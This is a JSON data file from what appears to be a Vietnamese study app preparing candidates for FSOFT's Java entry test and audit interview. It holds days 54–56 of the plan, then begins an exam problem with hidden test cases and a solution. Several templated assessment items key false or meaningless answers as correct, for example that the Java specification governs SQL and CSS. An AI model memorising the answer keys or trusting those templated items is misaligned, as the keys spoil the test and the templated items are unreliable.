        "Nắm vững toàn diện lý thuyết chuyên sâu về: SQL JOINs, GROUP BY/HAVING, Servlet lifecycle, Scopes, Forward vs Redirect.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "Ôn lại INNER vs LEFT JOIN, WHERE vs HAVING, DELETE vs TRUNCATE, Vòng đời Servlet, 4 Scopes, Forward vs Redirect.",
          "code": "// Rà soát SQL & Web"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d54_1",
          "level": "Medium",
          "question": "Câu lệnh SQL rà soát về xử lý NULL sau trả về kết quả là bao nhiêu dòng?",
          "code": "-- Bảng Users có 3 dòng: (1, 'An'), (2, NULL), (3, 'Binh')\nSELECT COUNT(*), COUNT(Name)\nFROM Users;",
          "options": [
            "COUNT(*) = 3, COUNT(Name) = 2",
            "COUNT(*) = 3, COUNT(Name) = 3",
            "COUNT(*) = 2, COUNT(Name) = 2",
            "Lỗi truy vấn do có giá trị NULL"
          ],
          "correctIndex": 0,
          "explanation": "`COUNT(*)` đếm tổng số dòng vật lý trong bảng, bất kể cột có null hay không, nên trả về `3`. Còn `COUNT(column_name)` chỉ đếm những dòng có giá trị KHÁC NULL, dòng thứ 2 có Name là NULL nên bị bỏ qua, trả về `2`."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: WHERE o.id IS NULL trong LEFT JOIN, Forward không đổi URL.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Rà soát SQL & Web",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Vấn đáp Audit 1-1: Java 8+ Advanced",
          "questions": [
            {
              "q": "Phương thức `reduce()` trong Stream API dùng để làm gì?",
              "ans": "Tổng hợp các phần tử của Stream thành một giá trị đơn duy nhất (ví dụ tính tổng, tìm max/min, nối chuỗi) dựa trên một hàm kết hợp nhị phân (`BinaryOperator`)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Cạm bẫy của Parallel Stream",
          "questions": [
            {
              "q": "Khi nào KHÔNG NÊN sử dụng `parallelStream()` trong Java 8?",
              "ans": "Khi: 1) Tập dữ liệu nhỏ (chi phí chia nhỏ và gom luồng vượt quá lợi ích). 2) Tác vụ có chia sẻ trạng thái có thể sửa đổi (Thread-unsafe). 3) Tác vụ bị nghẽn I/O (chặn các luồng trong chung `ForkJoinPool.commonPool()`)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Collectors.groupingBy()",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nList<String> words = Arrays.asList(\"apple\", \"banana\", \"apricot\");\nMap<Character, Long> result = words.stream()\n    .collect(Collectors.groupingBy(w -> w.charAt(0), Collectors.counting()));\nSystem.out.println(result);\n```\nKết quả in ra là gì?",
              "ans": "In ra: `{a=2, b=1}`. Các từ bắt đầu bằng chữ 'a' có 2 từ (\"apple\", \"apricot\"), bắt đầu bằng chữ 'b' có 1 từ (\"banana\")."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy Optional.get() mà không kiểm tra",
          "questions": [
            {
              "q": "Gọi trực tiếp `optional.get()` khi đối tượng đang rỗng sẽ ném ra ngoại lệ gì?",
              "ans": "Ném ngoại lệ `java.util.NoSuchElementException: No value present`."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "CompletableFuture kết hợp nhiều tác vụ bất đồng bộ",
          "questions": [
            {
              "q": "Hàm nào trong `CompletableFuture` được dùng để ghép nối hai tác vụ phụ thuộc lẫn nhau (kết quả tác vụ 1 là đầu vào tác vụ 2)?",
              "ans": "`thenCompose()` (tương đương với `flatMap` của Monad)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_54_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề SQL JOINs, GROUP BY/HAVING, Servlet lifecycle, Scopes, Forward vs Redirect?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của SQL JOINs, GROUP BY/HAVING, Servlet lifecycle, Scopes, Forward vs Redirect phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần SQL JOINs, GROUP BY/HAVING, Servlet lifecycle, Scopes, Forward vs Redirect."
        },
        {
          "id": "da_54_2",
          "q": "Khi thao tác với SQL JOINs, GROUP BY/HAVING, Servlet lifecycle, Scopes, Forward vs Redirect, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Tổng kết 3 bẫy SQL và Servlet trong phần Web Backend?",
          "a": "1. So sánh với NULL bằng toán tử `=` thay vì `IS NULL`.\n2. Biến instance trong Servlet bị chia sẻ đa luồng gây tranh chấp dữ liệu (Race condition).\n3. Nhầm lẫn forward (giữ nguyên request, URL không đổi) với sendRedirect (tạo request mới, URL đổi).",
          "trap": "Luôn dùng PreparedStatement để chống SQL Injection."
        }
      ],
      "dailyEnglish": [
        {
          "id": 2,
          "vi": "Thực hiện xóa các trận đấu",
          "en": "Delete matches"
        },
        {
          "id": 3,
          "vi": "Tìm kiếm các trận đấu theo ngày giờ",
          "en": "Search matches by time"
        },
        {
          "id": 4,
          "vi": "Thực hiện thêm các trận đấu",
          "en": "Add matches"
        },
        {
          "id": 5,
          "vi": "(Kiểm tra [var] có tồn tại hay không )",
          "en": "Check if [var] exists"
        },
        {
          "id": 6,
          "vi": "return true if [var] exist or false if not exist (Trả về \"true\" nếu [var] tồn tại hoặc \"false\"nếu [var] không tồn tại",
          "en": "Return \"True\" if [var] exists or false if [var] does not exist"
        }
      ]
    },
    "55": {
      "day": 55,
      "week": 8,
      "title": "Rà soát FEE, Spring & English Comment Code",
      "topics": [
        "Box model, JS let/const, Spring IoC/DI, 79 câu Comment Code"
      ],
      "tasks": [
        "Chạy qua toàn bộ 79 câu Comment Code Anh-Việt",
        "Tập nói lại 5 câu trả lời Spring Audit"
      ],
      "englishDrill": [
        {
          "id": 5,
          "vi": "(Kiểm tra [var] có tồn tại hay không )",
          "en": "Check if [var] exists"
        },
        {
          "id": 6,
          "vi": "return true if [var] exist or false if not exist (Trả về \"true\" nếu [var] tồn tại hoặc \"false\"nếu [var] không tồn tại",
          "en": "Return \"True\" if [var] exists or false if [var] does not exist"
        },
        {
          "id": 7,
          "vi": "(Lấy số ngày nghỉ của một tháng)",
          "en": "Get number of days off of a month"
        },
        {
          "id": 8,
          "vi": "(Lấy các tháng của năm)",
          "en": "Get months of year"
        },
        {
          "id": 9,
          "vi": "(Lấy tất cả dữ liệu về ngày nghỉ của các tháng và các năm trong database)",
          "en": "Get all days off of months and years from database"
        }
      ],
      "summary": "Tuần 8 Final Review: Rà soát FEE, Spring Framework & 79 câu Comment Code Anh - Việt.",
      "coreTheory": "Ôn lại CSS Box Model, display:none vs visibility:hidden, Spring IoC/DI, @RestController, chạy qua toàn bộ 79 câu Comment Code.",
      "codeSnippet": "// Rà soát FEE, Spring & English",
      "traps": [
        "box-sizing: border-box, @Autowired constructor injection."
      ],
      "quickQuiz": [
        {
          "q": "Quy tắc đặt tên biến và phương thức trong Java theo chuẩn Clean Code của Oracle/FSOFT là gì?",
          "a": "Sử dụng camelCase bắt đầu bằng chữ thường (vd: `calculateSalary()`, `totalAmount`), tên phải có nghĩa mô tả hành động (động từ cho phương thức, danh từ cho biến), không viết tắt khó hiểu."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Box model, JS let/const, Spring IoC/DI, 79 câu Comment Code.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "Ôn lại CSS Box Model, display:none vs visibility:hidden, Spring IoC/DI, @RestController, chạy qua toàn bộ 79 câu Comment Code.",
          "code": "// Rà soát FEE, Spring & English"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_55_1",
          "level": "Easy",
          "question": "Kiểm tra lại:",
          "code": "// Rà soát FEE, Spring & English",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "Duyệt qua danh sách 79 câu Comment Code."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: box-sizing: border-box, @Autowired constructor injection.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Rà soát FEE, Spring & English",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Comment Code IT English & Code Review",
          "questions": [
            {
              "q": "Các tag Javadoc chuẩn nhất để tài liệu hóa tham số, giá trị trả về và ngoại lệ là gì?",
              "ans": "`@param <name> <description>`, `@return <description>`, `@throws <ExceptionClass> <condition>`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Tiêu chuẩn trả lời phỏng vấn kỹ thuật bằng tiếng Anh",
          "questions": [
            {
              "q": "Cấu trúc trả lời câu hỏi phỏng vấn chuẩn STAR là gì?",
              "ans": "S (Situation): Bối cảnh dự án. T (Task): Nhiệm vụ cụ thể. A (Action): Hành động kỹ thuật đã thực hiện. R (Result): Kết quả đạt được bằng số liệu cụ thể."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace và refactor code smell",
          "questions": [
            {
              "q": "Đoạn code sau vi phạm nguyên tắc Clean Code nào:\n```java\npublic void process(int flag, Object data) {\n    if (flag == 1) { /* 100 dòng code xử lý user */ }\n    else if (flag == 2) { /* 100 dòng code xử lý order */ }\n}\n```",
              "ans": "Vi phạm Single Responsibility Principle (SRP): Phương thức làm quá nhiều việc khác nhau dựa trên tham số cờ `flag` (Flag Argument code smell). Cần tách thành 2 phương thức độc lập: `processUser()` và `processOrder()`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy nuốt ngoại lệ (Swallowed Exception)",
          "questions": [
            {
              "q": "Tại sao viết `catch (Exception e) {}` (khối catch rỗng) bị coi là lỗi nghiêm trọng nhất trong review code?",
              "ans": "Vì nó che giấu hoàn toàn lỗi phát sinh, khiến hệ thống hoạt động sai lệch trong im lặng mà không để lại bất kỳ log nào, vô hiệu hóa khả năng điều tra sự cố trong môi trường Production."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Bảo vệ giải pháp kiến trúc trước Senior Tech Lead",
          "questions": [
            {
              "q": "Khi Tech Lead phản biện: 'Tại sao bạn chọn giải pháp dùng Cache Redis thay vì tối ưu câu query SQL?', bạn trả lời thế nào?",
              "ans": "'Tối ưu câu query và index là bước bắt buộc đầu tiên. Tuy nhiên, với dữ liệu có tỷ lệ đọc vượt trội (95% Read / 5% Write) và ít thay đổi, việc sử dụng Redis in-memory cache giúp giảm trực tiếp tải I/O lên Database chính, đưa độ trễ phản hồi xuống dưới 5ms và đảm bảo hệ thống mở rộng chịu tải cao.'"
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_55_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Box model, JS let/const, Spring IoC/DI, 79 câu Comment Code?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Box model, JS let/const, Spring IoC/DI, 79 câu Comment Code phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Box model, JS let/const, Spring IoC/DI, 79 câu Comment Code."
        },
        {
          "id": "da_55_2",
          "q": "Khi thao tác với Box model, JS let/const, Spring IoC/DI, 79 câu Comment Code, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Tổng kết 3 điểm mấu chốt phần Frontend, Spring và Comment Code IT?",
          "a": "1. `box-sizing: border-box` giúp kiểm soát chính xác kích thước layout.\n2. `@Autowired` tự động inject phụ thuộc theo kiểu dữ liệu (by Type).\n3. Comment Code FPT dịch chính xác theo thuật ngữ chuyên ngành, không dịch thô từ sang từ.",
          "trap": "Dịch comment code chú ý các từ khóa: Validate, Check exist, Retrieve, Execute."
        }
      ],
      "dailyEnglish": [
        {
          "id": 5,
          "vi": "(Kiểm tra [var] có tồn tại hay không )",
          "en": "Check if [var] exists"
        },
        {
          "id": 6,
          "vi": "return true if [var] exist or false if not exist (Trả về \"true\" nếu [var] tồn tại hoặc \"false\"nếu [var] không tồn tại",
          "en": "Return \"True\" if [var] exists or false if [var] does not exist"
        },
        {
          "id": 7,
          "vi": "(Lấy số ngày nghỉ của một tháng)",
          "en": "Get number of days off of a month"
        },
        {
          "id": 8,
          "vi": "(Lấy các tháng của năm)",
          "en": "Get months of year"
        },
        {
          "id": 9,
          "vi": "(Lấy tất cả dữ liệu về ngày nghỉ của các tháng và các năm trong database)",
          "en": "Get all days off of months and years from database"
        }
      ]
    },
    "56": {
      "day": 56,
      "week": 8,
      "title": "GRAND FINALE: Full Mock Exam & Tự Tin Đi Thi",
      "topics": [
        "Tổng kết lộ trình 8 tuần"
      ],
      "tasks": [
        "Làm bài Final Mock Exam (30 câu đầy đủ mọi mảng)",
        "Đọc lại Error Book lần cuối",
        "Nghỉ ngơi, ngủ sớm, chuẩn bị tinh thần chiến thắng!"
      ],
      "englishDrill": [
        {
          "id": 8,
          "vi": "(Lấy các tháng của năm)",
          "en": "Get months of year"
        },
        {
          "id": 9,
          "vi": "(Lấy tất cả dữ liệu về ngày nghỉ của các tháng và các năm trong database)",
          "en": "Get all days off of months and years from database"
        },
        {
          "id": 10,
          "vi": "Xóa tất cả ngày nghỉ của một tháng",
          "en": "Delete all days off of a month"
        },
        {
          "id": 11,
          "vi": "(Trả về true nếu thành công hoặc false nếu thất bại",
          "en": "Return \"true\" on success or \"false\" on failure"
        },
        {
          "id": 12,
          "vi": "(Đăng ký hoặc update ngày nghỉ của một tháng)",
          "en": "Register or update days off of a month"
        }
      ],
      "summary": "GRAND FINALE: Bài thi thử tổng hợp cuối cùng & Tự tin chiến thắng!",
      "coreTheory": "\n### Lời khuyên trước ngày thi:\n1. Bạn đã đi qua đủ 8 tuần với toàn bộ lộ trình và làm chủ hàng trăm bẫy lý thuyết.\n2. Hôm nay không học thêm bất kỳ kiến thức mới nào. Chỉ làm 1 đề Full Mock cuối cùng để tạo cảm giác quen tay.\n3. Đọc lại Sổ Lỗi (Error Book) một lượt.\n4. Ăn uống đầy đủ, ngủ sớm trước 22h, giữ tinh thần thoải mái, tự tin bước vào phòng thi và đạt điểm số xuất sắc!\n",
      "codeSnippet": "// Chúc bạn thi tốt và đạt kết quả cao nhất!",
      "traps": [
        "Giữ vững tâm lý bình tĩnh, không vội vàng nộp bài trước khi soát lại."
      ],
      "quickQuiz": [
        {
          "q": "Khi phỏng vấn Audit 1-1, nếu được hỏi: 'Sự khác biệt giữa abstract class và interface từ Java 8 trở đi là gì?', bạn trả lời thế nào?",
          "a": "Abstract class đại diện cho bản chất danh tính (IS-A), có state (instance variable), có constructor và hỗ trợ mọi access modifier; Interface đại diện cho năng lực (CAN-DO), từ Java 8 có default/static method và Java 9 có private method, nhưng biến luôn là `public static final` và không có state riêng hay constructor."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Tổng kết lộ trình 8 tuần.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Lời khuyên trước ngày thi:\n1. Bạn đã đi qua đủ 8 tuần với toàn bộ lộ trình và làm chủ hàng trăm bẫy lý thuyết.\n2. Hôm nay không học thêm bất kỳ kiến thức mới nào. Chỉ làm 1 đề Full Mock cuối cùng để tạo cảm giác quen tay.\n3. Đọc lại Sổ Lỗi (Error Book) một lượt.\n4. Ăn uống đầy đủ, ngủ sớm trước 22h, giữ tinh thần thoải mái, tự tin bước vào phòng thi và đạt điểm số xuất sắc!\n",
          "code": "// Chúc bạn thi tốt và đạt kết quả cao nhất!"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d56_1",
          "level": "Hard",
          "question": "Câu hỏi tổng duyệt cuối cùng: Đoạn code Java Core tổng hợp sau in ra kết quả gì?",
          "code": "public class GrandFinale {\n    public static void main(String[] args) {\n        int count = 0;\n        for (int i = 0; i < 3; i++) {\n            switch (i) {\n                case 0: count += 1; break;\n                case 1: count += 2;\n                case 2: count += 3; break;\n            }\n        }\n        System.out.println(\"Final Score: \" + count);\n    }\n}",
          "options": [
            "Final Score: 9",
            "Final Score: 6",
            "Final Score: 12",
            "Final Score: 7"
          ],
          "correctIndex": 0,
          "explanation": "1. Lần lặp i = 0: khớp case 0, count += 1 = 1, break switch.\n2. Lần lặp i = 1: khớp case 1, count += 2 = 3. Không có break, rơi tự do sang case 2, count += 3 = 6, break switch.\n3. Lần lặp i = 2: khớp case 2, count += 3 = 9, break switch.\nTổng kết in ra: `Final Score: 9`."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Giữ vững tâm lý bình tĩnh, không vội vàng nộp bài trước khi soát lại.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Chúc bạn thi tốt và đạt kết quả cao nhất!",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Tổng kết toàn diện Entry Test & Audit",
          "questions": [
            {
              "q": "Ba tiêu chí cốt lõi người chấm thi Audit của FSOFT đánh giá ứng viên là gì?",
              "ans": "1) Nắm chắc bản chất gốc của ngôn ngữ (Java Core mechanics). 2) Khả năng giải thích rành mạch, tự tin, không ấp úng. 3) Tư duy Clean Code và thái độ học hỏi cầu tiến."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Chiến thuật trả lời khi gặp câu hỏi không biết chắc",
          "questions": [
            {
              "q": "Nếu trong buổi phỏng vấn 1-1 gặp một câu hỏi chưa từng gặp, bạn ứng xử như thế nào?",
              "ans": "Thành thật thừa nhận chưa có cơ hội thực chiến sâu về điểm này, nhưng chủ động phân tích hướng tiếp cận logic dựa trên các nguyên lý cốt lõi đã biết (ví dụ từ thiết kế JVM hoặc mô hình mạng), thể hiện rõ tư duy giải quyết vấn đề."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace bài toán kinh điển phỏng vấn FSOFT",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nString s1 = \"abc\";\nStringBuffer sb = new StringBuffer(\"abc\");\nSystem.out.println(s1.equals(sb));\n```\nKết quả in ra là gì? Tại sao?",
              "ans": "In ra: `false`! Hàm `s1.equals(sb)` của class `String` kiểm tra `instanceof String` đầu tiên. Vì `StringBuffer` không phải là `String`, nó lập tức trả về `false` mà không so sánh chuỗi ký tự."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy lạm dụng Singleton trong đa luồng",
          "questions": [
            {
              "q": "Tại sao mẫu Double-Checked Locking khi tạo Singleton bắt buộc biến `instance` phải có từ khóa `volatile`?",
              "ans": "Để ngăn chặn hiện tượng sắp xếp lại lệnh của CPU/Compiler (Instruction Reordering). Không có `volatile`, luồng khác có thể đọc thấy tham chiếu `instance` khác null nhưng đối tượng bên trong thực tế chưa khởi tạo xong."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Tuyên ngôn hoàn thành xuất sắc lộ trình",
          "questions": [
            {
              "q": "Bạn đã sẵn sàng bước vào kỳ thi Entry Test và phỏng vấn Audit của FSOFT với tâm thế như thế nào?",
              "ans": "Sẵn sàng 100% với nền tảng kiến trúc vững chắc, nắm rõ mọi bẫy đề thi từ lý thuyết JVM đến dòng chảy mã nguồn thực tế, tự tin vượt qua mọi bài kiểm tra với kết quả xuất sắc!"
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_56_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Tổng kết lộ trình 8 tuần?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Tổng kết lộ trình 8 tuần phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Tổng kết lộ trình 8 tuần."
        },
        {
          "id": "da_56_2",
          "q": "Khi thao tác với Tổng kết lộ trình 8 tuần, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Tâm thế và lời khuyên quan trọng nhất của một Senior trước khi bước vào phòng thi?",
          "a": "Tự tin, bình tĩnh, đọc kỹ đề bài và tuyệt đối không vội vàng phán đoán cảm tính. Kiểm tra lỗi biên dịch trước khi trace kết quả. Quản lý thời gian kỷ luật và tin tưởng vào lộ trình 56 ngày ôn luyện bài bản!",
          "trap": "Bạn đã được trang bị đầy đủ kiến thức và bẫy thi, hãy tự tin giành điểm tối đa!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 8,
          "vi": "(Lấy các tháng của năm)",
          "en": "Get months of year"
        },
        {
          "id": 9,
          "vi": "(Lấy tất cả dữ liệu về ngày nghỉ của các tháng và các năm trong database)",
          "en": "Get all days off of months and years from database"
        },
        {
          "id": 10,
          "vi": "Xóa tất cả ngày nghỉ của một tháng",
          "en": "Delete all days off of a month"
        },
        {
          "id": 11,
          "vi": "(Trả về true nếu thành công hoặc false nếu thất bại",
          "en": "Return \"true\" on success or \"false\" on failure"
        },
        {
          "id": 12,
          "vi": "(Đăng ký hoặc update ngày nghỉ của một tháng)",
          "en": "Register or update days off of a month"
        }
      ]
    }
  },
  "peProblems": [
    {
      "id": "pe_01_reverse_words",
      "title": "PE 01: Đảo Ngược Từng Từ Trong Câu (Reverse Words)",
      "difficulty": "Easy",
      "category": "Strings & Chars",
      "dayRef": 1,
      "description": "Cho một chuỗi ký tự `s` chứa các từ được phân tách bởi một hoặc nhiều khoảng trắng.\n\nHãy viết hàm đảo ngược thứ tự các từ trong chuỗi và chuẩn hóa khoảng trắng:\n- Giữa hai từ bất kỳ chỉ có đúng một dấu cách đơn `' '`.\n- Không chứa khoảng trắng thừa ở đầu chuỗi (leading) và cuối chuỗi (trailing).\n\n*Đây là bài thi PE kinh điển kiểm tra khả năng xử lý chuỗi cơ bản trong Java không dùng regex phức tạp.*",
      "inputFormat": "Một chuỗi ký tự `s` (chuỗi không rỗng).",
      "outputFormat": "Chuỗi kết quả sau khi đảo ngược thứ tự các từ và loại bỏ khoảng trắng thừa.",
      "constraints": "1 <= s.length() <= 10^4\ns chỉ chứa chữ cái tiếng Anh (hoa và thường), chữ số và khoảng trắng `' '`.\nCó ít nhất một từ trong `s`.",
      "examples": [
        {
          "input": "\"the sky is blue\"",
          "output": "\"blue is sky the\"",
          "explanation": "Thứ tự 4 từ bị đảo ngược hoàn toàn, giữa các từ phân cách bởi 1 dấu cách."
        },
        {
          "input": "\"  hello world  \"",
          "output": "\"world hello\"",
          "explanation": "Khoảng trắng thừa ở đầu và cuối chuỗi đã được loại bỏ sạch sẽ."
        },
        {
          "input": "\"a good   example\"",
          "output": "\"example good a\"",
          "explanation": "Nhiều khoảng trắng liên tiếp giữa các từ được thu gọn thành đúng 1 dấu cách."
        }
      ],
      "starterCode": "public class Solution {\n    public String reverseWords(String s) {\n        // Viết code chay của bạn ở đây\n        \n        return \"\";\n    }\n}",
      "driverCode": "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextLine()) {\n            String s = sc.nextLine();\n            Solution sol = new Solution();\n            System.out.print(sol.reverseWords(s));\n        }\n    }\n}",
      "testCases": [
        {
          "id": 1,
          "input": "the sky is blue",
          "expectedOutput": "blue is sky the",
          "isHidden": false
        },
        {
          "id": 2,
          "input": "  hello world  ",
          "expectedOutput": "world hello",
          "isHidden": false
        },
        {
          "id": 3,
          "input": "a good   example",
          "expectedOutput": "example good a",
          "isHidden": false
        },
        {
          "id": 4,
          "input": "Java",
          "expectedOutput": "Java",
          "isHidden": true
        },
        {
          "id": 5,
          "input": "   FPT   Software   Entry   Test   ",
          "expectedOutput": "Test Entry Software FPT",
          "isHidden": true
        }
      ],
      "hints": [
        "Bước 1: Sử dụng phương thức s.trim() để bỏ khoảng trắng thừa 2 đầu.",
        "Bước 2: Có thể dùng s.split(\"\\\\s+\") để tách các từ dựa trên 1 hoặc nhiều dấu cách.",
        "Bước 3: Dùng StringBuilder ghép các từ từ cuối mảng về đầu mảng kèm dấu cách."
      ],
      "solution": "public class Solution {\n    public String reverseWords(String s) {\n        String[] words = s.trim().split(\"\\\\s+\");\n        StringBuilder sb = new StringBuilder();\n        for (int i = words.length - 1; i >= 0; i--) {\n            sb.append(words[i]);\n            if (i > 0) sb.append(\" \");\n        }\n        return sb.toString();\n    }\n}"
    },
    {
      "id": "pe_02_valid_identifier",
      "title": "PE 02: Kiểm Tra Định Danh Hợp Lệ (Valid Java Identifier)",
      "difficulty": "Easy",
      "category": "Java Core Syntax",
      "dayRef": 1,
